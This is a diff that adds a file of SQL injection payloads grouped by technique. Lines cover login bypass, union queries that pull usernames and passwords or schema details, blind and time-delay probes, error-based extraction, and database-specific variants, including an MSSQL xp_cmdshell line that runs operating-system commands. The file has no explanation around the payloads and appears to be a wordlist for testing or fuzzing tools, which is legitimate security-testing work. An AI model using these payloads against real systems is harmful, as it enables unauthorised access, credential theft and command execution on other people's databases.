@@ -1,0 +1,55 @@
+# SQL Injection Payloads
+
+# Authentication Bypass
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1'/*
+admin' --
+admin' #
+admin'/*
+') OR '1'='1' --
+') OR ('1'='1
+
+# Union-Based
+' UNION SELECT NULL --
+' UNION SELECT NULL, NULL --
+' UNION SELECT NULL, NULL, NULL --
+' UNION SELECT username, password FROM users --
+' UNION SELECT 1, database() --
+' UNION SELECT table_name, NULL FROM information_schema.tables --
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
+
+# Boolean Blind
+' AND 1=1 --
+' AND 1=2 --
+' AND substring(@@version,1,1)='5' --
+
+# Time-Based Blind
+' AND SLEEP(5) --
+' OR IF(1=1, SLEEP(5), 0) --
+'; WAITFOR DELAY '00:00:05' --
+
+# Error-Based
+' AND 1=CONVERT(int, @@version) --
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version))) --
+
+# MySQL Specific
+' AND ROW(1,1)>(SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x) --
+
+# PostgreSQL Specific
+' AND 1=CAST((SELECT version()) AS int) --
+
+# MSSQL Specific
+'; EXEC xp_cmdshell('dir') --
+' AND 1=CONVERT(int, @@version) --
+
+# Oracle Specific
+' UNION SELECT NULL, banner FROM v$version --
+' UNION SELECT NULL, table_name FROM all_tables --
+
+# Common Database Functions
+' UNION SELECT @@version, NULL --
+' UNION SELECT database(), NULL --
+' UNION SELECT user(), NULL --
+' UNION SELECT current_user(), NULL --
